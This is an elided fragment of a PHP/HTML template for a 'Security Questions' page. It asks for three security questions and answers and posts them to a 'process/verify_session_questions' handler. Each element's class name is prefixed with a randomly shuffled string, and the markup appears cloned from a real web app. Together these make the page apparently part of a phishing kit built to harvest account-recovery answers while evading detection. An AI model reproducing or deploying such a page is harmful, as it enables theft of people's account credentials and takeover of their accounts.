					...
					<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container container--fluid">
						<div data-v-282502d4="" id="content">
							<div data-v-5dcd7cb4="" data-v-282502d4="">
								<h1 data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-h4">Security Questions</h1>
								<div data-v-2906dda8="" data-v-5dcd7cb4="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> row">
									<div data-v-2906dda8="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> col-md-5 col-lg-4 col">
										<form data-v-5dcd7cb4="" method="post" action="process/verify_session_questions" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-form" data-v-2906dda8="">
														...
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																	...
																	<select autocomplete="new-password" name="q1" required="true" id="q1" type="text">
													...
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																...
																<input autocomplete="new-password" placeholder="Answer" id="a1" name="a1" required="true" type="text"> </div>
														</div>
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__details">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages theme--light">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages__wrapper"></div>
													...
													<div data-v-a240bf3a="" data-v-dfd49888="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																	<label for="new-password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
																	<select autocomplete="new-password" name="q2" required="true" id="q2" type="text">
																		<option value="">-- Choose a Question --</option>
																		<option value="What was the name of your High School?">What was the name of your High School?</option>
																		<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
																		<option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
												...
												<div data-v-a240bf3a="" data-v-dfd49888="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																<label for="confirm-password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
																<input autocomplete="new-password" placeholder="Answer" id="a2" name="a2" required="true" type="text"> </div>
														</div>
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__details">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages theme--light">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages__wrapper"></div>
													...
													<div data-v-a240bf3a="" data-v-dfd49888="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																	<label for="new-password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
																	<select autocomplete="new-password" name="q3" required="true" id="q3" type="text">
																		<option value="">-- Choose a Question --</option>
																		<option value="What was the name of your High School?">What was the name of your High School?</option>
																		<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
																		<option value="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
												...
												<div data-v-a240bf3a="" data-v-dfd49888="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input theme--light v-text-field v-text-field--is-booted">
													<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__control">
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-input__slot">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__slot">
																<label for="confirm-password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-label theme--light" style="left: 0px; right: auto; position: absolute;"></label>
																<input autocomplete="new-password" placeholder="Answer" id="a3" name="a3" required="true" type="text"> </div>
														</div>
														<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-text-field__details">
															<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages theme--light">
																<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> v-messages__wrapper"></div>
